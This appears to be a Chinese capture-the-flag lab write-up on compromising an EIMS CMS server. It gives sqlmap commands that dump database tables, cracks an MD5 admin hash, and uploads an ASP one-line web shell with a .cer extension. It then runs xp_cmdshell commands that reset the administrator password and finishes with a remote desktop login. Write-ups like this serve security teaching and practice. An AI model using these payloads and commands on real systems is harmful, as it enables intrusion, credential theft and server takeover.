### 一．SQL注入

1.发现网站是由eims搭建的，该cms存在sql注入漏洞

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_5500eef0.png)

2.利用sqlmap判断是否存在sql注入

python sqlmap.py -u http://192.168.100.100/Notice.asp?ItemID=18

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_50dfd7d9.png)



3.查看当前mssql都有那些数据库

python sqlmap.py -u http://192.168.100.100/Notice.asp?ItemID=18 --dbs

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_3c160db5.png)



4.查看Test_EIMS数据库的表

python sqlmap.py -u http://192.168.100.100/Notice.asp?ItemID=18 -D Test_EIMS --tables

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_1d6e67a2.png)

5.发现flag表，查看表内容

python sqlmap.py -u http://192.168.100.100/Notice.asp?ItemID=18 -D Test_EIMS -T eims_flag --dump

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_m4a2bb9a5.png)

6.查看账号密码的数据库表

对b2076528346216b3进行md5解密。

解密得密码为admin1234账号为root

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_2cf024fd.png)



7.在后台登录页面，查看网站源代码发现flag

http://192.168.100.100/admin/Login.asp

flag2{890b0c4958ef57e9264a9d2703ea7e8c}

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_m4e0531f6.png)

### 二．文件上传

1.使用账号密码登录后台

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_1cd9c228.png)

2.在后台系统信息-文件上传处上传后缀为.cer的asp一句话木马，一句话木马内容：<%eval request("caidao")%>

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_m3d1b5115.png)

3.直接用菜刀连接一句话木马

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_2d3f89e.png)

4.在网站根目录发现flag文件

flag3{23c5b149510105853f5e7ef9a6f06627}

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_m75e07064.png)

5.在数据库配置文件中找到数据库的账号密码

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_m3c0f0f04.png)

使用一句话木马连接mssql数据库

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_mf6a4f0f.png)

6.利用mssql数据库的xpcmdshell组件执行系统命令

EXEC master..xp_cmdshell 'whoami'

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_489144d6.png)

7.当前cmdshell的权限是system权限，所以直接修改administrator的密码为Simplexue123

EXEC master..xp_cmdshell 'net user administrator Simplexue123'

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_m2feaf42d.png)

### 三．远程登陆

1.直接远程桌面连接服务器

在桌面发现flag文件

flag5{47baf6d9d60f40c8b1dafa56c62fcd06}

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_m4e80713.png)

2.在c盘发现另外一个flag文件

flag4{e35a01e91e1833d266f95881ae83b4ca}

![img](http://192.168.33.1/uploads/20180330/permeate_11_html_73ed529d.png)